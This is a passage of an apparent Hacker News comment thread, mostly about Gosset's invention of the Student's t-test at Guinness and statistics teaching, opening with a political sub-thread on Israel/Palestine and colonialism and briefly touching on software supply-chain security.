Mass killings of jews had already started in eastern europe decades before the holocaust. which was what prompted zionism. This is not a singular event, but a movement that would happen with the british or without them. And any result of the conflict would cause serious \"disaster\" for one people or another reply colechristensen 15 hours agorootparentprevReally the ultimate cause for all of that pain and suffering is the failure of the Ottoman Empire which was quite cosmopolitan while it lasted. There is plenty to criticize about the actions taken by many parties post-collapse, but I strongly doubt it's at all possible for external powers to take a failed empire and keep all the pieces happy in the aftermath. Those people have to do most of that themselves, and in this case they didn't for many reasons. Europe was ready for the transition away from monarchy and empire, the middle east wasn't. Russia/USSR tried a path that worked but not particularly well. Luck and circumstance also played a part. A century of war and strife post empire collapse isn't exactly unusual. reply ithkuil 12 hours agorootparentWell it was cosmopolitan because it conquered many people in an area that was cosmopolitan from the start (in particular Constantinople) and as long as they didn't fight back for their independence they were tolerated. That's not much different from the current state of Israel which allows Arabs to live in it (and even have political representation!). I don't know how to square the elevation of the tolerance in the ottoman empire while at the same time decrying the apartheid within Israel's borders. The situation is fucked up. It's hard to have justice and peace. reply colechristensen 9 hours agorootparent> I don't know how to square the elevation of the tolerance in the ottoman empire while at the same time decrying the apartheid within Israel's borders. Well for starters I don’t test the Ottoman Empire in the 19th century and Israel in the 21st against the same standard. We’re not saying the Ottomans were great by a modern western standard, but compared to most of the west in their day they were quite good. reply ithkuil 4 hours agorootparentyeah, fair enough. I don't think there one \"right way\" of looking at all this. I think it's important to keep all those things in mind at the same time, including what you're saying about standards and how they change over time. My point was that when we look back at times of peaceful coexistence within empires, it was often the results of suppression of dissent. Empires are fundamentally at odds with national self determination. Empires are by definition violent subjugation of people and self-determination movements often require violence to counteract that. It's easy to take past empires for granted and assume they are \"how things are\"; but when they fail and crumble they do so for a reason, they contain the seed of their own destruction, because they impose stability and order over internal and extern forces that push against them. reply 0xDEAFBEAD 13 hours agoparentprevnext [24 more] [flagged] plorkyeran 13 hours agorootparentAre you confused about why purchasing a large amount of nearly empty land with minimal disruption to the small number of people living there produced less conflict than a large number of people moving into an already-occupied area? The Alaska Purchase and the Israel/Palestine situation are two of the least similar things you could possibly pick to compare. reply 0xDEAFBEAD 13 hours agorootparentPopulation density is certainly a valid hypothesis, but wouldn't it be nice to have a dataset to test it against? reply d1sxeyes 12 hours agorootparentOf course. But your example is a bit like 'why is it so difficult to build a hundred-storey building? My uncle John built a shed in his back yard once, perhaps we should ask him to share how he did it.' reply hoseja 8 hours agorootparentprevJudea was mostly empty too. reply hdaz0017 6 hours agorootparentprevHow many global religions that date back a few weeks or so, are all wanting to be on the same postage stamp within Alaska? https://en.wikipedia.org/wiki/Religion_in_Israel Alaska's first census in 1880 counted 33,426 people! Alaska had 731,007 residents on July 1, 2019, size 663,268 square miles. There's about 1.7 million displaced people in Gaza today, size 2,260 square miles reply insane_dreamer 4 hours agorootparentprevAlaska was sparsely populated and had no (as of then discovered) natural resources. It was also not strongly tied to ethnic identity and religion as Palestine is both to Jews and Muslim Arabs. And it did not have a huge influx of people needing land which immediately set the scene for conflict with established inhabitants. reply ein0p 13 hours agorootparentprevWhat’s missing in your world view is that “high functioning” countries largely ride on the backs of lower functioning ones and depend on low cost labor to sustain their quality of living. Eg the US is just coming off of 20+ years of riding on China’s back. reply robertlagrant 10 hours agorootparent> largely ride on the backs of lower functioning ones Where has this lie come from? \"Higher functioning\" countries generally stem from countries that were doing well long before they met many other countries. The British invented naval clocks, required to circumnavigate the globe, before they went round the globe on a regular basis. How did they do that if everyone was equal before they met? reply ein0p 8 hours agorootparentReally? You’re going to claim that the prosperity of Britain did not come from systematically plundering the rest of the world? Is this what you’re going to go with as your counterpoint? reply JetSetWilly 6 hours agorootparentIt didn't. It came from the Industrial Revolution and a step change in the productivity of british society. Many economic studies have shown that the \"Empire\" and especially parts of it like India, the African colonies etc were a net negative to Britain economically speaking. This should not be surprising - just as Afghanistan or Iraq were a net negative to the US more recently, but still allowed certain segments of US society (the military industrial complex) to enrich themselves at the expense of other parts. Probably in 50 or 100 years there will be some Afghan nationalist movement which will be telling everyone that the entirety of US wealth is based on plunder of Afghanistan. That's roughly how it is with India nationalists and Britain today, but of course, it is nonsense. reply itsoktocry 8 hours agorootparentprev>Really? You’re going to claim that the prosperity of Britain did not come from systematically plundering the rest of the world? I think the OP's question is how did Britain get it a position where it had the capability to \"systematically plunder the rest of the world\"? Do you think that was luck? Were the British simply \"evil\", and everyone else not so? One has to assume they were already high-functioning, prior to the plundering. reply heavenlyblue 7 hours agorootparentBritish empire sucked until Spanish got so rich they basically destroyed their economy reply ein0p 3 hours agorootparentprevI never claimed it was luck. I merely pointed out the mechanism of acquiring the riches. Eg most people in the US have no idea much of the East Coast was built with money from the Chinese opium trade, and how many of our “elites” got their start as basically drug cartel members. There’s lots of this in the history of any empire. You just have to dig a little - the empires don’t like to talk about how they made their first trillion reply JackFr 13 hours agorootparentprev> Eg the US is just coming off of 20+ years of riding on China’s back. That China’s per capita GDP increased 4x over that period — was that because of, or in spite of the US ‘riding on their back’? reply ein0p 3 hours agorootparentYes. Same as you can be exploited and grow your earnings over time as you move up the value chain. Note however how unbelievably strenuously the US is trying to keep them from progressing technologically. It’s to the point of imposing its will on _other_ countries by now. That is not accidental, and it has nothing to do with “national security” or whatever. It’s just to be able to milk that teat for a little longer. Military gear by design uses older chips that are easy to produce should a war break out. reply RomanAlexander 12 hours agorootparentprevmost people can only see \"winners\" and \"losers\" in economic transactions. reply immibis 10 hours agorootparentprevWe gave them lots of money. When there's more money, prices go up. When prices go up, GDP goes up. reply 0xDEAFBEAD 12 hours agorootparentprevAmerica's biggest sources of imports are Mexico, Canada, China, Germany, and Japan. I'm wishing we could do more to improve the lives of people living in countries like Sudan, Venezuela, Burundi, Haiti, DR Congo, etc. They're humans too even if they don't make the news. Right now those countries are too dysfunctional to be competitive for most exports. https://data.worldbank.org/indicator/NE.EXP.GNFS.ZS?most_rec... reply ivanhoe 8 hours agorootparentProblem is that they've been made so dysfunctional by colonialism, and then often even after formally gaining independence, they continued to be purposefully destroyed by colonial forces through colonial taxes, financing corruptions, political influences, etc. Haiti was one of the riches countries in that part of the world, until France killed their economy by sanctions in revenge for their successful slave uprising. It lasted until 20th century, Haiti was paying France huge money. Some African countries are still to this day paying France taxes and France keeps all their money in the French central bank. Other countries like Belguim, Spain and even US were not much better. US dealers were buying off the colonial debts and traded with them on US stock-exchanges until 1940s or so. And today this continues in the form of corruption by multi-national corporations. Almost all diamond mines are owned by a few western companies. Do you really think they want progressive democratic government in any of those countries? Nope, corrupted dictators are way better for business... reply itsoktocry 8 hours agorootparent>Problem is that they've been made so dysfunctional by colonialism Every country was a utopia until the British and French got there? >Almost all diamond mines are owned by a few western companies. How valuable are diamonds if not for the demand and marketing of the colonial nations? reply interactivecode 5 hours agorootparentLife is objectively worse for people under colonial rule. Are you saying the incas should thank the Spanish for boosting their immune system? Should native Americans be happy their children got sterilized? reply ivanhoe 8 hours agorootparentprevNot really comparable: 1) Alaska was (and still is) a huge, and very sparsely populated land 2) For the native population it was not a big difference whether Russians or Americans ruled them, none of them treated them well - it was a colony and all they cared of was getting the natural resources. 3) Russians were not kicked out of their homes, as there was very few of them there in the first place (mostly working for the government). And then there was also proportionally very little American settlers coming in compared to the vastness of the land available. If you want a better comparison with US history, look at the Trail of Tears, it's much closer to what happened in Israel... reply CPLX 7 hours agorootparentOr the Sullivan Campaign, or any of the many directly comparable examples. reply mmastrac 21 hours agoprevInteresting read. I don't think this came up in my stats classes: > Gosset solved many problems at the brewery with his new technique. The self-taught statistician published his t-test under the pseudonym “Student” because Guinness didn’t want to tip off competitors to its research. Although Gosset pioneered industrial quality control and contributed loads of other ideas to quantitative research, most textbooks still call his great achievement the “Student’s t-test.” reply CrazyStat 17 hours agoparentThis is such a great story, it should be included in every intro stats class (I did, back when I taught intro stats). Gosset didn’t have the mathematical background to derive the correct distribution theoretically, so he figured out what it was by simulating drawing samples of different sizes thousands of times and fitting curves. Simulating, in those days, meant writing numbers on thousands of cards, then shuffling and drawing a sample. Calculate the mean and standard deviation. Repeat. Thousands of times. He published the result with an apologetic shrug for not being able to prove it properly. reply 0xDEAFBEAD 14 hours agorootparentIt's interesting how mathematically shallow most stats presentations are. In most other areas I've studied, you start from some basics like axioms and gradually build up machinery by proving theorems etc. But presentations I've seen of the t-test focus on when and how to use it, without going very deep into the derivation at all. This leaves me skeptical of the movement to replace calculus with stats in high school. It's true that an ordinary citizen will find stats more useful. But for students who will go on to become scientists and engineers, I think they should study calculus. Calculus is a better on-ramp to the sort of rigor you need in upper-level math. And I'm concerned that a bad \"cargo cult\" stats class may be worse than no stats education at all. Calculus education seems harder to screw up. reply CrazyStat 5 hours agorootparentCalculus is also mathematically shallow in that sense: the subject where you start with axioms and gradually build up the machinery of calculus is (Real) Analysis, which is not part of the standard calculus curriculum and which the vast majority of people taking calculus will never study [1]. A typical Calculus class expects students to memorize and use things like trig function integrals which are presented without proof; not so different from memorizing and using statistical tests presented without proof, in my opinion. In an intro statistics class I think conceptual depth is more important than mathematical depth. It's more important that students really understand the concept of probabilistic inference, both hypothesis tests and confidence intervals, than that they understand the mathematical derivation of the t distribution [2]. Unfortunately intro stats classes often fail on this count as well. One of the (many) straws that eventually broke my desire to teach was a committee decision--a committee composed entirely of people not teaching intro stats--to disallow students from bringing formula cheatsheets to exams, effectively forcing us to make the students memorize formulas rather than focusing on conceptual understanding. [1] When I took Real Analysis there was a calculus class that met right before us in the same room, which often ran over so that the calculus students would be packing up as we entered the room. One day as we're sitting down one of them asks us what class we're there for, and then asks what Real Analysis is all about, since he's never heard of it. One of my classmates responded with the absolutely perfect \"Well, our homework last night was integrating x^2 from 0 to 1.\" [2] I'd say the same goes for Calculus, for what it's worth; actually understanding what an integral means is more important than being able to set up the Reimann sum and take the limit. reply blt 11 hours agorootparentprevNot sure why you are downvoted for this. Your points have merit. I agree that stats classes can have a \"cookbook\" flavor and do not generally lead to a deep understanding of probability. But I would rather fix the stats classes than abandon the topic. Does anyone really argue to replace calculus with stats? I thought the idea was to offer both and let students choose based on their interests. reply jll29 3 hours agorootparentPropbabilities, combinatorics, logics and sets are the most valuable things from high school maths that benefitted me all the way through from teenager to professor. Calculus is intellectually stimulating, but for my line of work (dealing with uncertaintly, risk, decision making, AI), other parts of mathematics are more useful. However, I would not argue calculus should be replaced. I would argue for more \"proper\" maths to replace \"recipe-like\" maths. It's more important to go deeper on a topic than what the topic is. reply CrazyStat 3 hours agorootparentCombinatorics would make a great high school math course, honestly. Lots of fun puzzles and very approachable. reply ForOldHack 14 hours agorootparentprevUm. Wow. That's quite a story. But, it's not real. \"owever, Guinness had a policy of not publishing company data, and allowed Gosset to publish his observations on the strict understanding that he did so anonymously.\" I'm 1906, Gosset was the guest of Person at UCL, and since Gosset had a First in Math, and Professor Pearson was the leading mathematician and publisher of the Bell curve.. Gosset spent a year at UCL. University College London. A year with an expert looking over his shoulder? I would think that he would publish with an extreme amount of confidence, forgoing the need for an apolocetic shrug, which I have never ever heard of. Never, and I have a degree in math with a minor in Statistics. They had playing cards. You are arguing for large sample sizes, which is not economical - precisely against the design of the test - which looks surprisingly suspicious. reply CrazyStat 5 hours agorootparent> I would think that he would publish with an extreme amount of confidence, forgoing the need for an apolocetic shrug, which I have never ever heard of. Never, and I have a degree in math with a minor in Statistics. Good for you. As you might have guessed from reading that I used to teach statistics, I have a bit more than a minor in the subject. Your attempt to appeal to authority, not to put too fine a point on it, falls flat. Just because you haven’t heard of a thing don’t mean it isn’t true. We can, after all, just read the original paper: > Before I had succeeded in solving my problem analytically, I had endeavoured to do so empirically. The material used was a correlation table containing the height and left middle finger measurements of 3000 criminals, from a paper by W. R. Macdonnell (Biometrika, i, p. 219). The measurements were written out on 3000 pieces of cardboard, which were then very thoroughly shuffled and drawn at random. As each card was drawn its numbers were written down in a book, which thus contains the measurements of 3000 criminals in a random order. Finally, each consecutive set of 4 was taken as a sample—750 in all—and the mean, standard deviation, and correlation5 of each sample determined. The difference between the mean of each sample and the mean of the population was then divided by the standard deviation of the sample, giving us the z of Section III. As for the apologetic shrug, in the course of the “analytic solution” we have: > The law of formation of these moment coefficients appears to be a simple one, but I have not seen my way to a general proof. and then after a bit more math guessing the correct distribution based on the moments > Consequently a curve of Prof. Pearson’s Type III may he expected to fit the distribution of s2. My story is slightly off; Gosset only used one sample size rather than several different sample sizes. But he did use simulation with thousands of hand written cards as his approach to the problem, he did fail to prove the correct distribution (moments are not sufficient to determine the distribution), and he did publish with an apologetic shrug. reply zinekeller 11 hours agorootparentprev> But, it's not real. \"owever, Guinness had a policy of not publishing company data, and allowed Gosset to publish his observations on the strict understanding that he did so anonymously.\" Except that this part is true. Obviously, he is well-known in academic circles, but Guinness did have a policy against its employees to publish their research using a pseudonym[1]. [1] Specifically, they can publish with three conditions: 1) To not mention Guinness or its competitors, 2) To not mention anything about beer (so topics specifically about beer is forbidden), and 3) To not publish using their surname (which in practical effect is to publish using a pseudonym). reply jll29 3 hours agorootparentprevTypo: guest of Person => Karl Pearson reply richrichie 16 hours agorootparentprevalong with compulsory Guinness tasting :) reply jbjbjbjb 19 hours agoparentprevI always thought that name was strange but I never thought to look it up. Stats books are so dry, they don’t have the inclination to share these kinds of stories. reply roenxi 17 hours agorootparentDoubly unfortunate because the philosophical aspects of statistics are more important to students than most of maths. There are something like 4 different schools of thought [0] and people will have a natural propensity to one of them. Although they all agree on the formulas and rigorous aspects, it is actually a challenging proposition to comprehend what someone is doing if you strongly see the world from one perspective and don't realise that academics are potentially approaching the interpretation in one of 3 other ways. It adds a lot of dryness to the textbook because the author can really only talk about the objective parts in an introductory classroom setting. But if you're getting taught by a frequentist and have a subjectivity bent it is easy to spend a year or two confused before someone clues you in that there are unresolved questions of interpretation. [0] https://en.wikipedia.org/wiki/Interpretation_of_probability reply enasterosophes 17 hours agorootparent> people will have a natural propensity to one of them. I see what you did there reply riffraff 14 hours agorootparentprevInteresting, my university book of the subject was pretty tiny but it did talk of the different interpretations, but it only mentioned frequentist and bayesian. I did not suspect the story was much more complicated. reply ayhanfuat 19 hours agorootparentprevYou probably missed it. This is something stat book authors love to mention. I don’t remember a stat intro book that doesn’t have a footnote for “Student t”. reply BeetleB 17 hours agorootparentJust went through mine a few months ago. It definitely doesn't have it. reply whimsicalism 16 hours agorootparentwhat book? i'm honestly curious because of how frequently this story is repeated in stats textbooks reply BeetleB 1 hour agorootparentThe author is Jay Devore. reply jldugger 19 hours agorootparentprev> Stats books are so dry, they don’t have the inclination to share these kinds of stories. It doesn't have to be that way. My pandemic lockdown read was a 10 dollar Stats textbook[1], that comes with tons of classic examples: the Salk polio vaccine, a prosecutor misusing the multiplication rule using purely circumstantial evidence (\"what are the odds that police pulled over the wrong couple matching 10 different pieces of description by the victim?\"), the classic Gallup poll showing FDR would defeat Landon (versus incumbent _Literary Digest_ showing a Landon win), Gosset's history with Guiness, the early history of probability as gambling strategy, a controversy over Mendel's data on pea plant heredity being _too_ clean, and so on. Sadly, while this book left me well prepared to apply statistical reasoning in my day job, it's departure from typical pedagogy left me feeling unprepared for further reading based on perusal of Stats Wikipedia -- what's a kernel? what's a moment? etc. [1]: https://www.amazon.com/Statistics-Fourth-David-Freedman-eboo... reply madcaptenor 17 hours agorootparentIn a former life I taught some intro stat courses from this book. It’s a good book for an intro course for people who aren’t going on to further stat classes, although I think for a current class I’d want something that acknowledges how statistics and computers have gotten all tied up with each other. (I don’t have any recommendations - it’s not my job to know this any more.) reply orhmeh09 16 hours agorootparentprevI liked this one a lot Abelson, R. P. (1995). Statistics as Principled Argument. Psychology Press. https://www.routledge.com/Statistics-As-Principled-Argument/... > In this illuminating volume, Robert P. Abelson delves into the too-often dismissed problems of interpreting quantitative data and then presenting them in the context of a coherent story about one's research. Unlike too many books on statistics, this is a remarkably engaging read, filled with fascinating real-life (and real-research) examples rather than with recipes for analysis. It will be of true interest and lasting value to beginning graduate students and seasoned researchers alike. The focus of the book is that the purpose of statistics is to organize a useful argument from quantitative evidence, using a form of principled rhetoric. Five criteria, described by the acronym MAGIC (magnitude, articulation, generality, interestingness, and credibility) are proposed as crucial features of a persuasive, principled argument. Particular statistical methods are discussed, with minimum use of formulas and heavy data sets. The ideas throughout the book revolve around elementary probability theory, t tests, and simple issues of research design. It is therefore assumed that the reader has already had some access to elementary statistics. Many examples are included to explain the connection of statistics to substantive claims about real phenomena. reply alpple 19 hours agorootparentprevI wonder if dry reading means written without the influence of drink. I couldn't find an answer online. But, if so, it would be ironic to describe a stat book that ignored a brewer as dry. reply TillE 19 hours agorootparentprevThe history of just about anything is very interesting, but it's generally not relevant in a textbook which has a specific purpose. reply mp05 19 hours agorootparentI agree with the sentiment, but I always have wondered what t-test a real engineer uses and why they only teach the \"Student\" version. Given the context, a bit of a clarifier would have been appreciated. reply nxobject 19 hours agorootparentprevWait until you hear about the bad blood between Fisher and Pearson. reply whimsicalism 18 hours agorootparentprevsorry but this is a classic story mentioned in almost every basic stats textbook i’ve read reply jll29 4 hours agoparentprevMany international conferences are regularly held in Dublin, and attendees often visit the Guinness brewery as part of conferences' social events, where a memorial plaque reminds them of Gosset and his important contributions to statistics. reply mindcrime 19 hours agoparentprevAt least they let him publish, albeit under a pseudonym. It makes me wonder how many potentially useful discoveries were made in industrial settings, and wound up being buried due to management not wanting to risk leaking competitive information. The good news, I suppose, would be if you believe that it's rarely the case that only one person could ever discover something. Then you can conclude that all (most?) such discoveries were eventually (or will eventually be) rediscovered independently. On a related note... I wonder how much valuable research disappears (more or less) when companies fold, get acquired, etc. Take MCC[1] for example. I've been doing a lot of reading lately that involves old papers from the 1990's on \"agents\" and \"multi-agent systems\". And time and time again, in the references, you'll see something like \"MCC Technical Report TR86-32791\" or some-such. Occasionally said report can be found online, but quite a few of them seem to be either hard - or impossible - to find. Maybe there's an archive of physical papers stored away somewhere, but FSM knows where the heck such a thing would be, or how hard it would be to get access. A similar situation came up a while back when we started discussing \"sharding\" here on HN[2]. There was a lot of effort spent trying to identify when the term first arose, and a lot of evidence pointed to a particular paper that was internal to CCA, who were acquired by Xerox. And now that original paper seems to be unobtanium. The paper probably still exists somewhere in the bowels of Xerox, but good luck ever getting your hands on it. [1]: https://en.wikipedia.org/wiki/Microelectronics_and_Computer_... [2]: https://news.ycombinator.com/item?id=36848605 reply schneems 19 hours agorootparent> It makes me wonder how many potentially useful discoveries were made in industrial settings, and wound up being buried due to management not wanting to risk Probably a lot. I’ve come to find out that some dinosaur companies won’t even let their programmers open up issues on open source repos (forget sending patches or releasing their own software). The logic goes like this: if someone found the log4j zero day before it was reported they could comb through all issues and see the companies that the users worked for then try to target them. In this case any comment would indicate possible involvement. The least bit of security, through the tiniest extra bit of obscurity. Thankfully many of these companies are starting to come around and realizing that a lack of involvement with open source is more risky than accidental 3rd hand information leaking (like what dependencies doesn’t certain company use). reply vlovich123 18 hours agorootparentThe easiest counter to this is that, to my knowledge at least, it’s easier to build a vulnerability scanner than to scrape repos for more targeted attacks. reply schneems 16 hours agorootparentThe \"No lieutenant, your men are already dead\" defense. I like it. I think that if your threat model includes nation states (and the companies I was referencing above was largely S&P500 financial institutions) then you have to think the attacker also doesn’t want to trip off any alarms with a ham fisted port scan blasting the precious zeroday exploit all over the internet. Your point is still extremely valid though. Which is why the counter I provided is that the best defense is to get as many engineers’ eyes on the problem and in the codebase as possible to prevent or find it before it becomes an issue. Things like lib XZ are scary, but it’s even scarier if not caught before it’s in the wild. reply vlovich123 14 hours agorootparentThe dirty secret is that nation states can get your software dependency list pretty easily in a number of ways (e.g. sending agents to meetups to nerd out & make friends would be an expensive way but there’s other social engineering attacks I’ve observed). The other secret is that monitoring software can’t detect anomalies ahead of time & the vulnerability scan will not show up meaningfully any different than all the other random traffic already happening. Your nation state can hide it’s vulnerability scan amongst all the other vulnerability scanners already running (both legit as a service when you request it against your server & illegitimate actors trying to find a way in). So at best a ham fisted search is unlikely to really tip your hand in a meaningful way unless it requires having penetrated a few layers of your security to begin with. As for libxz, the scary part is that as an industry we recognize the security challenge of not compensating maintainers and yet we have lackluster responses to fixing it (e.g. Google trying to pay OSS maintainers to harden their security while completely ignoring that a huge problem is that the maintainers can’t devote full time which opens an avenue for malicious actors to overwhelm maintainers & take control socially as happened with libxz). reply wodenokoto 13 hours agoparentprevI always found \"student\" confusing in the name. Like, is there a \"professors t-test\" or something? I personally found a lot of peace after learning that tidbit. reply squirrel6 15 hours agoparentprevThis was in my textbook and my professor covered it as well! Class of 17 here reply petesoper 16 hours agoparentprev54 years after I was mystified trying to parse the use of \"student\" for this, here is the answer. Cool! reply colmmacc 15 hours agoprevMy first year of working at AWS was in the \"DUB1\" site, which was part of the Digital Hub (a tech and incubator space). As it happened ... Amazon's small office was in William Sealy Gosset's old laboratory, right beside St. Patrick's Tower where the Guinness cooperage was. As a former statistics lecturer, I excitedly told everyone I worked with how lucky we were, to almost no reaction! Can you imagine? A long time ago I submitted William Sealy Gosset as a suggestion for commemoration with an Irish Postage Stamp; but nothing has ever come of it. I hope some day he gets more recogonition. reply VagabundoP 10 hours agoprevI went to school beside the Guinness brewery. The smell of the hops brewing will remain with me forever. However the school was dirt poor in many ways and they wouldn't sponsor our school football team to buy some kit. This was back in the 80's Ireland with massive unemployment and huge emigration. Ironically the school had a computer lab way beyond its time when one ex-pupil donated a couple of Apple Macs and a dozen Apple IIe's. That's were I cut my teeth on some - probably BASIC - programming, learning myself. On Topic - Guinness were always canny and ahead of their time. Getting a job there was like winning the lotto, you were pretty much made for life. reply OisinMoran 18 hours agoprevGuinness was way ahead of their time and in many ways the Google of their day (building accomodation, high pay, great perks). My granddad worked there so all my dad's brother and sisters learned to swim in the Guinness swimming pool! Funnest tidbit is that the widget to get a good head from cans won the best invention of the year, the year the internet wax invented. For an excellent piece on many more interesting bits about Guinness, check this out: https://www.thefitzwilliam.com/p/no-great-stagnation-in-guin... reply wodenokoto 6 hours agoparentSince you called them the google of the day, it’s only fitting to mention that Guinness in “The Guinness book of record” refers to the brewery. And much like how we use Google to settle discussion in pubs today, the book was published to do that very same thing, back then. reply rob74 10 hours agoparentprevIt also apparently pioneered the practice of companies getting tax (or in their case, lease) concessions for \"investing in Ireland\"... reply mcphage 18 hours agoparentprevI don’t think I’ll ever be interested in Internet Wax. reply crispyambulance 1 hour agoprevSometimes I wonder about the actual utility of the T-test compared to just looking at a pair of boxplots, with jittered points (or some other indication of the number of data points). If it isn't plainly evident from the boxplots (assuming you've got \"enough points\") do T-tests alone ever make a truly compelling argument? reply tmoravec 1 hour agoparentThat would not be exactly scientific. T-test can be calculated independently and verified. reply _dain_ 1 hour agorootparentBut you still need to choose a significance threshold, which is just an opinion. There's nothing \"scientific\" about p=0.05; surely God loves p=0.06 almost as much. reply jhbadger 17 hours agoprevI love these sorts of of things. I was fortunate enough to have this fact mentioned in my stats book in undergrad, and later when I was in Dublin and touring the Guinness brewery, they had a small exhibit on Gosset (although Gossett was actually based out of their brewery in England). Another fun fact that I learned in organic chemistry was that Alexander Borodin (the Russian composer who composed \"In the Steppes of Central Asia\" and \"Prince Igor\") was only a composer in his spare time and was actually professionally an organic chemist who was the co-discoverer of the aldol reaction https://en.wikipedia.org/wiki/Alexander_Borodin reply schneems 19 hours agoprevI did a talk in 2019 where I mention that tidbit. Of course, to properly do it justice I had to bring a Guinness and open it on stage. Here’s a video from EuRuKo that was filmed on a decommissioned ocean liner converted into a hotel and conf space https://youtu.be/Aczy01drwkg?si=lsVWAFv9f3eLc2fZ&t=1095 reply apsurd 18 hours agoparentdamn, unfortunate the rabbit makes this unwatchable. otherwise, i love beer and great story, i'll just read about it. reply schneems 17 hours agorootparentI agree. You can read the talk here https://www.schneems.com/2020/09/16/the-lifechanging-magic-o.... I introduced the voiceover artist at the beginning, she’s a Japanese speaker that I found on fiver. I chose her because the talk was being given at a Japanese speaking conference (Ruby Kaigi). I love the foil of having a second character on screen but having an accented cartoon was not the right effect I was going for. I’m still experimenting with multiple characters in my talks but my most recent one I did doesn’t use any actors and I read their lines like a narrator. I think the effect works much better https://m.youtube.com/watch?v=-8UQMH6p-Mw&list=PL9oQ7yETvN12... reply apsurd 16 hours agorootparentah, appreciate the reply, and the spirit of creativity. Kinda feel like I got caught being overly critical and here is the actual creator! Thanks for receiving it well and also for putting your stuff out there. reply schneems 16 hours agorootparentI’m kinda glad you said something to be honest. I wanted to mention the voiceover being cringe but it’s also hard to pre-apologize for something without raising a lot of alarm bells. I’m still proud of the overall talk. I’m glad I pushed a limit, found it, and learned from it. Your comment stated what you saw and how you felt about it. I think you did a great job speaking up without lashing out or talking down. I appreciate that. reply whimsicalism 16 hours agorootparentprevi would advise maybe toning down the strength of your criticism when addressing the creator of the content /2c reply schneems 14 hours agorootparentI appreciate you sticking up for me. I can see this comment being taken poorly by others. I also think we generally need to learn to empathize that the creator might experience our words different than how we mean them (and therefore be kinder when we post). In this case, I was aware that the rabbit is tough to watch so I have the empathy for my viewer and the comment came across as honest rather than harsh. I don’t think you should be downvoted. If it was a different time or place then I 100% could have taken it the wrong way. reply tombert 19 hours agoprevThis doesn't surprise me; any industry involved with basically any manufacturing seems like a perfect testing ground for statistical methods. There's enough scale in these things where subtle differences can save tons of money, so it can be beneficial pretty quickly. I always thought the t-test was clever just because of how simple it was compared to more advanced stuff. reply firesteelrain 18 hours agoparentWe covered this in my Research Methods class as part of my Systems Engineering Masters. Growing and agriculture in the early 1900s benefitted from things like ANOVA, blocking factors, nuisance factors, factors, levels, ranges and experiment design such as full factorial design. It is taken for granted these days. F statistic, F crit, etc reply gwern 17 hours agoprevI feel like OP unfortunately mostly misses the point of Gosset's work and the t-test, in the usual way of people taught the contemporary bastardization of Gosset/Fisher/Pearson/Neyman as NHST. The important thing isn't that it lets you calculate some _p_-value; the important thing is that it is a framework for decision-making, where you can trade off your false-positive and your false-negative rates to make the economically rational decision: https://www.tandfonline.com/doi/full/10.1080/00031305.2018.1... In this case, because it is a well-understood problem with the rates of bad batches easily established from the brewery's records of testing & drinking, it lets the brewery decide on how many 'off' batches it wants to risk in exchange for saving the cost of a certain number of test-samples. You decide you want to risk 1 bad batch in 100 for a false negative while rejecting 1 good batch in 20, then you need _n_ samples etc. And this directly translates better measurements (by lowering variance, eg. by blocking) into money: the lower the variance, the fewer samples you need to achieve any given tradeoff, thereby saving the brewery money on scrapped material or testing. The smaller the better, hence Student's inability to use asymptotics or approximations: they might be off by orders of magnitude. (He would even try to do _n_ = 2 tests!) Or they might be trying to tightly optimize alcohol content, to avoid taxation for passing high-alcohol content thresholds, but also avoid going too low to disappoint their customers, so Student would explicitly calculate out scenarios, for example: > Thus, Gosset concluded, “In order to get the accuracy we require [that is, 10 to 1 odds with 0.5 accuracy], we must, therefore, take the mean of [at least] four determinations.” The Guinness Board cheered. The Apprentice Brewer found an economical way to assess the behavior of population parameters, using very small samples. (If you're thinking this sounds like a very subjective-Bayesian decision-theory thing to write, you are right, although Student would have rejected that, like most statisticians, and emphasized that he was dealing with populations with known base rates, and so nothing Bayesian was necessary; it was just a frequentist decision-theory approach.) reply nextos 15 hours agoparentThat article you posted is excellent, thank you. Also relevant: https://www.tandfonline.com/doi/abs/10.1080/01621459.1982.10... reply the-mitr 7 hours agoprevI read this story and several other very interesting ones in this great book detailing the history of evolution of modern statistics -- The Lady Tasting Tea: How Statistics Revolutionized Science in the Twentieth Century by David Salsburg. The author himself personally met with several leading figures that he describes. Highly recommended! reply aitchnyu 8 hours agoprevLouis Pasteur developed his technique for wine and beer, and milk would benefit years later. https://en.wikipedia.org/wiki/Pasteurization reply paperhatwriter 8 hours agoprevComparing Guinness to an ‘earthy milkshake’ is one of the worst things I’ve ever read. reply iamcreasy 12 hours agoprev> Gosset recognized that this approach only worked with large sample sizes, whereas small samples of hops wouldn’t guarantee that normal distribution. So he meticulously tabulated new distributions for smaller sample sizes. Does it mean Gosset stop before the distribution converging to normal distribution? reply mcdonje 16 hours agoprevThis story appears in \"How to Measure Anything\" by Douglas Hubbard, which is worth a read if you're not already a stats and decision theory whiz. reply mcmoor 16 hours agoprevThis Guiness connection is the core of the jokes when explaining about t-test in Larry Gonick's History of Statistics. reply westurner 7 hours agoprevThe students' t distribution has a symmetric PDF (with no skew), and thus you assume that the sample and/or population also have such a PDF (Probability Distribution Function). t statistic > History: https://en.wikipedia.org/wiki/T-statistic#History Students' t distribution: https://en.wikipedia.org/wiki/Student%27s_t-distribution \"What are some alternatives to sample mean and t-test when comparing highly skewed distributions\" https://www.quora.com/What-are-some-alternatives-to-sample-m... : >> the Kolmogorov-Smirnov two-sample test, which essentially compares the empirical distribution functions of the two samples without implicitly assuming normality. http://en.wikipedia.org/wiki/Kolmogorov–Smirnov_test > You may also be interested in the Wald-Wolfowitz runs test (http://en.wikipedia.org/wiki/Wald–Wolfowitz_runs_test ) and the Mann-Whitney test (http://en.wikipedia.org/wiki/Mann–Whitney_U ). Statistical Significance > Limitations, Challenges: https://en.wikipedia.org/wiki/Statistical_significance#Limit... Statistical hypothesis test > Criticism, Alternatives: https://en.wikipedia.org/wiki/Statistical_hypothesis_test#Cr... There are Multivariate Students' t distributions: https://en.wikipedia.org/wiki/Multivariate_t-distribution Matrix t distribution: https://en.wikipedia.org/wiki/Matrix_t-distribution : > The generalized matrix t-distribution is the compound distribution that results from an infinite mixture of a matrix normal distribution with an inverse multivariate gamma distribution placed over either of its covariance matrices. But does a matrix t-distribution describe nonlinear variance in complex wave functions? Quantum statistical mechanics: https://en.wikipedia.org/wiki/Quantum_statistical_mechanics : > In quantum mechanics a statistical ensemble (probability distribution over possible quantum states) is described by a density operator S, which is a non-negative, self-adjoint, trace-class operator of trace 1 on the Hilbert space H describing the quantum system. A Q12 question: How frequently are quantum density operators described by a parametric t distribution? reply hoseja 8 hours agoprevArtificially pumping beer full of nitrogen is kinda weird you gotta 